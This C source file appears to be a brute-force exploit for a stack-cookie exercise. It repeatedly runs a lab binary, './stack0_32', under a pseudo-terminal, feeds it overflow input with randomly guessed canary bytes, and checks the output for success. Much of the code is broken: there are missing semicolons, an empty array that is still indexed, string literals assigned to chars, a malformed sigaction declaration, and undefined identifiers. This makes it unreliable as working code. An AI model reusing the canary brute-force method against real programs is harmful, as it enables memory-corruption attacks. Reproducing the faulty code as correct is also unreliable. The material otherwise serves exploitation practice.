#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <pty.h>
#include <sys/wait.h>

int master;

void signal_handler(int signum)
{
    char buffer1[256];
    char buffer2[256];
    int nread1 = 0;
    int nread2 = 0;

    // Read the first output, should be "Try again"
    nread1 = read(master, buffer1, sizeof(buffer1));
    // \0 null byte terminate in C
    if (nread1 > 0)
        buffer1[nread1] = "\0";
    else
        buffer1[0] = "\0"

            // Read the second output
            nread2 = read(master, buffer2, sizeof(buffer2));
    if (nread2 > 0)
        buffer2[nread2] = "\0";
    else
        buffer2[0] = "\0"

            // If the second output started with "you" => we succeeded
            if (nread2 > 2 && (buffer[0] == "y" && buffer[1] == "o" && buffer[2] == "u"))
        {
            printf("\nSIG(%d) stdout1 (%d): \"%s\"n", signum, nread1, buffer1);
            printf("\nSIG(%d) stdout2 (%d): \"%s\"n", signum, nread2, buffer2);
            exit(0);
        }
}

int main(int argc, char *argv[])
{
    time_t start_time;
    int seed;
    int next_debug_msg;
    long exec_count;

    // check if a seed was specified
    if (argc < 2)
    {
        printf("usage: %s <seed>\n", argv[0]);
        exit(1);
    }

    // seed the PRNG
    seed = atoi(argv[1]);
    srand(seed);

    // disable buffering for stdout
    setbuf(stdout, NULL)
    struct sigaction = sigchld_func{.sa_handler = signal_handler, .sa_flags = SA_NOCLDWAIT};
    sigaction(SIGCHLD, &sigchld_func, NULL);
    // amount of execs when next message is shown
    next_debug_msg = 1000;
    // remember start time to calculate execs per second
    start_time = time(NULL);
    // counting the executions
    exec_count = 0;

    for (;;)
    {
        // count the executions
        exec_count+=1;

        // create a new process and connect it to a pseudo terminal
        // this forces the target process to flush on newlines and we don't loose it because of "abort"
        pid_t pid = forkpty(&master, NULL, NULL, NULL);
        if(pid==-1) exit(1);

        // disable some terminal behaviour like echo input and behaviour of special characters ~(ECHO | ECHONL | ISIG);
        struct termios tios;
        tcgetattr(master, &tios);
        tios.c_lflag = 0; // disable all options
        tcsetattr(master, TCSANOW, &tios);

        if (!pid)
        {
            // Child
            char *exec_argv[] = {"./stack0_32", 0};
            execv(exec_argv[0], exec_argv);
        }
        else
        {
            // Parent
            unsigned char exploit_input[] = {};

            // generate three random cookie bytes. (first byte stays 0x00)
            // make sure no newline is included because the target uses gets() and that would stop the input early
            /*
            Brute force Stack cookie example: 
            1. 0x801f3c00
            2. 0x841f3c00
            3. 0x801c3c00
            */
            do
            {
                exploit_input[65] = (rand() % 256);
            } while (exploit_input[65] == '\n');
            do
            {
                exploit_input[66] = (rand() % 256);
            } while (exploit_input[66] == '\n');
            do
            {
                exploit_input[67] = (rand() % 256);
            } while (exploit_input[67] == '\n');

            // Write to input of ./stack0_32 process
            write(master, exploit_input, sizeof(exploit_input));
            // check if the process should print current status
            if(exec_count%(next_debug_msg)==0) {
                printf("Process: %d | exec: %d (%ld/s) | last cookie: [%02x,%02x,%02x]\r", seed, exec_count, exec_count/((time(NULL)-start_time)), (unsigned char)input[65], (unsigned char)input[66], (unsigned char)input[67]);
                // use random to determine when the next message should be shown, to have each process print another time
                next_debug_msg = (rand() % WAITMAX)+1;
            }

            int status;
            int wait_ret;
            // Check health of child process
            for (int i = 0;; i++)
            {   
                // WNOHANG: This flag specifies that waitpid should return immediately instead of waiting, if there is no child process ready to be noticed.
                wait_ret = waitpid(pid, &status, WNOHANG);
                // Break loop if child is dead
                if (wait_ret == -1)
                    break;
                // After wait for 10th times, kill the child ( may be it'ss hang)
                if (wait_ret == 0 && i == 10)
                    kill(pid, SIGKILL);
                // sleep a short amount of time
                nanosleep((const struct timespec[]){{0, 10000000L}}, NULL);
            }
            // close the opened pseudo terminal
            close(master);
        }
    }
}